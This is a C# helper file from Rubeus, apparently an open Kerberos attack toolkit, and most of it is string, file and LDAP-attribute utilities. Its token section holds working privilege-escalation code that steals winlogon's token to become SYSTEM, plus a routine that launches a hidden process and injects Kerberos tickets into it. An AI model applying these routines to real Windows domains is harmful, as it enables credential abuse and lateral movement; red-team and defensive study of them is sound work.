using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Threading;
using System.DirectoryServices;
using System.DirectoryServices.Protocols;
using Rubeus.lib.Interop;

namespace Rubeus
{
    public class Helpers
    {
        #region String Helpers

        public static IEnumerable<string> Split(string text, int partLength)
        {
            if (text == null) { Console.WriteLine("[ERROR] Split() - singleLineString"); }
            if (partLength < 1) { Console.WriteLine("[ERROR] Split() - 'columns' must be greater than 0."); }

            var partCount = Math.Ceiling((double)text.Length / partLength);
            if (partCount < 2)
            {
                yield return text;
            }
            else
            {
                for (int i = 0; i < partCount; i++)
                {
                    var index = i * partLength;
                    var lengthLeft = Math.Min(partLength, text.Length - index);
                    var line = text.Substring(index, lengthLeft);
                    yield return line;
                }
            }
        }

        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static bool IsBase64String(string s)
        {
            s = s.Trim();
            return (s.Length % 4 == 0) && Regex.IsMatch(s, @"^[a-zA-Z0-9\+/]*={0,3}$", RegexOptions.None);
        }

        public static byte[] StringToByteArray(string hex)
        {
            if ((hex.Length % 16) != 0)
            {
                Console.WriteLine("\r\n[X] Hash must be 16, 32 or 64 characters in length\r\n");
                System.Environment.Exit(1);
            }

            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        public static string ByteArrayToString(byte[] bytes) {
            char[] c = new char[bytes.Length * 2];
            int b;
            for (int i = 0; i < bytes.Length; i++) {
                b = bytes[i] >> 4;
                c[i * 2] = (char)(55 + b + (((b - 10) >> 31) & -7));
                b = bytes[i] & 0xF;
                c[i * 2 + 1] = (char)(55 + b + (((b - 10) >> 31) & -7));
            }
            return new string(c);
        }

        public static DateTime? FutureDate(DateTime date, string increase)
        {
            int multiplier;
            DateTime? returnDate = null;
            try
            {
                multiplier = Int32.Parse(increase.Substring(0, increase.Length - 1));
            }
            catch
            {
                Console.WriteLine("[X] Error invalid multiplier specified {0}, skipping.", increase.Substring(0, increase.Length - 1));
                return returnDate;
            }

            string period = increase.Substring(increase.Length - 1);

            switch (period)
            {
                case "m":
                    returnDate = date.AddMinutes(multiplier);
                    break;
                case "h":
                    returnDate = date.AddHours(multiplier);
                    break;
                case "d":
                    returnDate = date.AddDays(multiplier);
                    break;
                case "M":
                    returnDate = date.AddMonths(multiplier);
                    break;
                case "y":
                    returnDate = date.AddYears(multiplier);
                    break;
            }

            return returnDate;
        }

        public static Interop.PRINCIPAL_TYPE StringToPrincipalType(string name) {

            switch (name) {
                case "principal":
                    return Interop.PRINCIPAL_TYPE.NT_PRINCIPAL;
                case "x500":
                    return Interop.PRINCIPAL_TYPE.NT_X500_PRINCIPAL;
                case "enterprise":
                    return Interop.PRINCIPAL_TYPE.NT_ENTERPRISE;
                case "srv_xhost":
                    return Interop.PRINCIPAL_TYPE.NT_SRV_XHST;
                case "srv_host":
                    return Interop.PRINCIPAL_TYPE.NT_SRV_HST;
                case "srv_inst":
                    return Interop.PRINCIPAL_TYPE.NT_SRV_INST;
                default:
                    throw new ArgumentException($"name argument with value {name} is not supported");
            }
        }

        #endregion


        #region Token Helpers

        public static bool IsHighIntegrity()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static bool GetSystem()
        {
            if (IsHighIntegrity())
            {
                IntPtr hToken = IntPtr.Zero;

                Process[] processes = Process.GetProcessesByName("winlogon");
                IntPtr handle = processes[0].Handle;

                bool success = Interop.OpenProcessToken(handle, 0x0002, out hToken);
                if (!success)
                {
                    Console.WriteLine("[!] GetSystem() - OpenProcessToken failed!");
                    return false;
                }

                IntPtr hDupToken = IntPtr.Zero;
                success = Interop.DuplicateToken(hToken, 2, ref hDupToken);
                if (!success)
                {
                    Console.WriteLine("[!] GetSystem() - DuplicateToken failed!");
                    return false;
                }

                success = Interop.ImpersonateLoggedOnUser(hDupToken);
                if (!success)
                {
                    Console.WriteLine("[!] GetSystem() - ImpersonateLoggedOnUser failed!");
                    return false;
                }

                Interop.CloseHandle(hToken);
                Interop.CloseHandle(hDupToken);

                if (!IsSystem())
                {
                    return false;
                }

                return true;
            }
            else
            {
                return false;
            }
        }

        public static bool IsSystem()
        {
            var currentSid = WindowsIdentity.GetCurrent().User;
            return currentSid.IsWellKnown(WellKnownSidType.LocalSystemSid);
        }

        public static LUID GetCurrentLUID()
        {
            var luid = new LUID();

            bool Result;
            Interop.TOKEN_STATISTICS TokenStats = new Interop.TOKEN_STATISTICS();
            int TokenInfLength;
            Result = Interop.GetTokenInformation(WindowsIdentity.GetCurrent().Token, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, out TokenStats, Marshal.SizeOf(TokenStats), out TokenInfLength);

            if (Result)
            {
                luid = new LUID(TokenStats.AuthenticationId);
            }
            else
            {
                var lastError = Interop.GetLastError();
                Console.WriteLine("[X] GetTokenInformation error: {0}", lastError);
            }

            return luid;
        }

        public static LUID CreateProcessNetOnly(string commandLine, bool show = false, string username = null, string domain = null, string password = null, byte[] kirbiBytes = null)
        {
            Interop.PROCESS_INFORMATION pi;
            var si = new Interop.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            if (!show)
            {
                si.wShowWindow = 0;
                si.dwFlags = 0x00000001;
            }
            Console.WriteLine("[*] Showing process : {0}", show);
            var luid = new LUID();

            if (username == null) { username = Helpers.RandomString(8);}
            if (domain == null) { domain = Helpers.RandomString(8); }
            if (password == null) { password = Helpers.RandomString(8); }

            Console.WriteLine("[*] Username        : {0}", username);
            Console.WriteLine("[*] Domain          : {0}", domain);
            Console.WriteLine("[*] Password        : {0}", password);

            if (!Interop.CreateProcessWithLogonW(username, domain, password, 0x00000002, null, commandLine, 4, 0, Environment.CurrentDirectory, ref si, out pi))
            {
                var lastError = Interop.GetLastError();
                Console.WriteLine("[X] CreateProcessWithLogonW error: {0}", lastError);
                return new LUID();
            }

            Console.WriteLine("[+] Process         : '{0}' successfully created with LOGON_TYPE = 9", commandLine);
            Console.WriteLine("[+] ProcessID       : {0}", pi.dwProcessId);

            var hToken = IntPtr.Zero;
            var success = Interop.OpenProcessToken(pi.hProcess, 0x000A, out hToken);
            if (!success)
            {
                var lastError = Interop.GetLastError();
                Console.WriteLine("[X] OpenProcessToken error: {0}", lastError);
                return new LUID();
            }

            if (kirbiBytes != null)
            {
                IntPtr hDupToken = IntPtr.Zero;
                success = Interop.DuplicateToken(hToken, 2, ref hDupToken);
                if (!success)
                {
                    Console.WriteLine("[!] CreateProcessNetOnly() - DuplicateToken failed!");
                    return new LUID();
                }

                try
                {
                    success = Interop.ImpersonateLoggedOnUser(hDupToken);
                    if (!success)
                    {
                        Console.WriteLine("[!] CreateProcessNetOnly() - ImpersonateLoggedOnUser failed!");
                        return new LUID();
                    }
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }
                finally
                {
                    Interop.RevertToSelf();
                    Interop.CloseHandle(hDupToken);
                }
            }
            Interop.ResumeThread(pi.hThread);

            bool Result;
            Interop.TOKEN_STATISTICS TokenStats = new Interop.TOKEN_STATISTICS();
            int TokenInfLength;
            Result = Interop.GetTokenInformation(hToken, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, out TokenStats, Marshal.SizeOf(TokenStats), out TokenInfLength);
            Interop.CloseHandle(hToken);

            if (Result)
            {
                luid = new LUID(TokenStats.AuthenticationId);
                Console.WriteLine("[+] LUID            : {0}", luid);
            }
            else
            {
                var lastError = Interop.GetLastError();
                Console.WriteLine("[X] GetTokenInformation error: {0}", lastError);
                Interop.CloseHandle(hToken);
                return new LUID();
            }

            return luid;
        }

        #endregion


        #region File Helpers

        static public string GetBaseFromFilename(string filename)
        {
            return SplitBaseAndExtension(filename)[0];
        }

        static public string GetExtensionFromFilename(string filename)
        {
            return SplitBaseAndExtension(filename)[1];
        }

        static public string[] SplitBaseAndExtension(string filename)
        {
            string[] result = { filename, "" };
            string[] splitName = filename.Split('.');

            if (splitName.Length > 1)
            {
                result[1] = $".{splitName.Last()}";
                result[0] = filename.Substring(0, filename.Length - result[1].Length);
            }

            return result;
        }

        static public string MakeValidFileName(string filePath)
        {
            string fileName = filePath;
            string directoryPath = string.Empty;
            int lastSeparatorPosition = filePath.LastIndexOf(Path.DirectorySeparatorChar);
            if ((lastSeparatorPosition > -1) && (filePath.Length > lastSeparatorPosition))
            {
                fileName = filePath.Substring(lastSeparatorPosition + 1);
                directoryPath = filePath.Substring(0, lastSeparatorPosition + 1);
            }

            string invalidChars = new string(Path.GetInvalidFileNameChars());
            string escapedInvalidChars = Regex.Escape(invalidChars);
            string invalidRegex = string.Format(@"([{0}]*\.+$)|([{0}]+)", escapedInvalidChars);
            return directoryPath + Regex.Replace(fileName, invalidRegex, "_");
        }

        #endregion


        #region Misc Helpers

        public static void RandomDelayWithJitter(int delay, int jitter)
        {
            var timeToSleep = 0;

            if (delay == 0)
            {
                timeToSleep = 0;
            }
            else if (jitter == 0)
            {
                timeToSleep = delay;
            }
            else
            {
                var rnd = new Random();
                var percent = (int)Math.Floor((double)(jitter * (delay / 100)));
                timeToSleep = delay + rnd.Next(-percent, percent);
            }

            if (timeToSleep != 0)
            {
                Thread.Sleep(timeToSleep);
            }
        }

        static public int SearchBytePattern(byte[] pattern, byte[] bytes)
        {
            List<int> positions = new List<int>();
            int patternLength = pattern.Length;
            int totalLength = bytes.Length;
            byte firstMatchByte = pattern[0];
            for (int i = 0; i < totalLength; i++)
            {
                if (firstMatchByte == bytes[i] && totalLength - i >= patternLength)
                {
                    byte[] match = new byte[patternLength];
                    Array.Copy(bytes, i, match, 0, patternLength);
                    if (match.SequenceEqual<byte>(pattern))
                    {
                        return i;
                    }
                }
            }
            return 0;
        }

        static public bool WriteBytesToFile(string filename, byte[] data, bool overwrite = false)
        {
            bool result = true;
            string filePath = Path.GetFullPath(filename);

            try
            {
                if (!overwrite)
                {
                    if (File.Exists(filePath))
                    {
                        throw new Exception(String.Format("{0} already exists! Data not written to file.\r\n", filePath));
                    }
                }
                File.WriteAllBytes(filePath, data);
            }
            catch (Exception e)
            {
                Console.WriteLine("\r\nException: {0}", e.Message);
                result = false;
            }

            return result;
        }

        // Attributes that should always be returned as string[]
        private static string[] stringArrayAttributeNames =
        {
            "serviceprincipalname",
            "memberof"
        };

        // Attributes that represent Windows FILETIME (long -> DateTime)
        private static string[] datetimeAttributes =
        {
            "lastlogon",
            "lastlogoff",
            "pwdlastset",
            "badpasswordtime",
            "lastlogontimestamp",
        };

        // Attributes stored as date strings (already parsed by DirectoryServices)
        private static string[] dateStringAttributes =
        {
            "whenchanged",
            "whencreated"
        };

        // Attributes that should be returned as int
        private static string[] intAttributes =
        {
            "useraccountcontrol",
            "msds-supportedencryptiontypes"
        };

        // -----------------------------------------------------------------------
        // Helper: convert a raw LDAP value to the expected type for a given attr
        // -----------------------------------------------------------------------
        private static object NormalizeAdValue(string attrNameLower, object rawValue)
        {
            try
            {
                // --- string[] attributes ---
                if (stringArrayAttributeNames.Contains(attrNameLower))
                {
                    // Could arrive as string, byte[], or already string[]
                    if (rawValue is string s)
                        return new string[] { s };
                    if (rawValue is byte[] b)
                        return new string[] { System.Text.Encoding.UTF8.GetString(b) };
                    // Already the right type
                    return rawValue;
                }

                // --- int attributes ---
                if (intAttributes.Contains(attrNameLower))
                {
                    if (rawValue is int i)    return i;
                    if (rawValue is long l)   return (int)l;
                    if (rawValue is byte[] b) return BitConverter.ToInt32(b.Reverse().ToArray(), 0);
                    if (rawValue is string s) return int.Parse(s);
                    return Convert.ToInt32(rawValue);
                }

                // --- datetime (FILETIME long) attributes ---
                if (datetimeAttributes.Contains(attrNameLower))
                {
                    long fileTime = 0;
                    if (rawValue is long l)   fileTime = l;
                    else if (rawValue is int i) fileTime = i;
                    else if (rawValue is byte[] b && b.Length == 8)
                        fileTime = BitConverter.ToInt64(b, 0);
                    else if (rawValue is string s)
                        fileTime = long.Parse(s);
                    else
                        fileTime = Convert.ToInt64(rawValue);

                    if (fileTime == 0 || fileTime == long.MaxValue)
                        return (DateTime?)null;

                    return (DateTime?)DateTime.FromFileTimeUtc(fileTime);
                }

                // --- datestring attributes (whenCreated, whenChanged) ---
                if (dateStringAttributes.Contains(attrNameLower))
                {
                    if (rawValue is DateTime dt) return dt;
                    if (rawValue is string s)
                        return DateTime.ParseExact(s, "yyyyMMddHHmmss.f'Z'",
                            System.Globalization.CultureInfo.InvariantCulture,
                            System.Globalization.DateTimeStyles.AssumeUniversal);
                    return rawValue;
                }

                // --- generic: try to decode byte[] as UTF-8 string ---
                if (rawValue is byte[] bytes)
                    return System.Text.Encoding.UTF8.GetString(bytes);

                return rawValue;
            }
            catch
            {
                // If anything goes wrong, return the raw value so we don't crash
                return rawValue;
            }
        }

        // -----------------------------------------------------------------------
        // GetADObjects for LDAPS path (System.DirectoryServices.Protocols)
        // -----------------------------------------------------------------------
        public static List<IDictionary<string, Object>> GetADObjects(List<SearchResultEntry> results)
        {
            var ActiveDirectoryObjects = new List<IDictionary<string, Object>>();

            foreach (SearchResultEntry entry in results)
            {
                IDictionary<string, Object> obj = new Dictionary<string, Object>();

                foreach (string attrName in entry.Attributes.AttributeNames)
                {
                    string attrLower = attrName.ToLower();
                    var attr = entry.Attributes[attrName];

                    if (stringArrayAttributeNames.Contains(attrLower))
                    {
                        // Always build a string[] regardless of how many values there are
                        var arr = new string[attr.Count];
                        for (int i = 0; i < attr.Count; i++)
                        {
                            var raw = attr[i];
                            if (raw is byte[] b)
                                arr[i] = System.Text.Encoding.UTF8.GetString(b);
                            else
                                arr[i] = raw.ToString();
                        }
                        obj[attrLower] = arr;
                    }
                    else if (attr.Count == 1)
                    {
                        obj[attrLower] = NormalizeAdValue(attrLower, attr[0]);
                    }
                    else
                    {
                        var values = new List<object>();
                        foreach (var val in attr)
                            values.Add(NormalizeAdValue(attrLower, val));
                        obj[attrLower] = values;
                    }
                }

                ActiveDirectoryObjects.Add(obj);
            }

            return ActiveDirectoryObjects;
        }

        // -----------------------------------------------------------------------
        // GetADObjects for normal LDAP path (System.DirectoryServices)
        // -----------------------------------------------------------------------
        public static List<IDictionary<string, Object>> GetADObjects(SearchResultCollection results)
        {
            var ActiveDirectoryObjects = new List<IDictionary<string, Object>>();

            foreach (SearchResult entry in results)
            {
                IDictionary<string, Object> obj = new Dictionary<string, Object>();

                foreach (string propName in entry.Properties.PropertyNames)
                {
                    string propLower = propName.ToLower();
                    var values = entry.Properties[propName];

                    if (stringArrayAttributeNames.Contains(propLower))
                    {
                        // Always build a string[] regardless of how many values there are
                        var arr = new string[values.Count];
                        for (int i = 0; i < values.Count; i++)
                        {
                            var raw = values[i];
                            if (raw is byte[] b)
                                arr[i] = System.Text.Encoding.UTF8.GetString(b);
                            else
                                arr[i] = raw.ToString();
                        }
                        obj[propLower] = arr;
                    }
                    else if (values.Count == 1)
                    {
                        obj[propLower] = NormalizeAdValue(propLower, values[0]);
                    }
                    else
                    {
                        var list = new List<object>();
                        foreach (var val in values)
                            list.Add(NormalizeAdValue(propLower, val));
                        obj[propLower] = list;
                    }
                }

                ActiveDirectoryObjects.Add(obj);
            }

            return ActiveDirectoryObjects;
        }

        #endregion
    }
}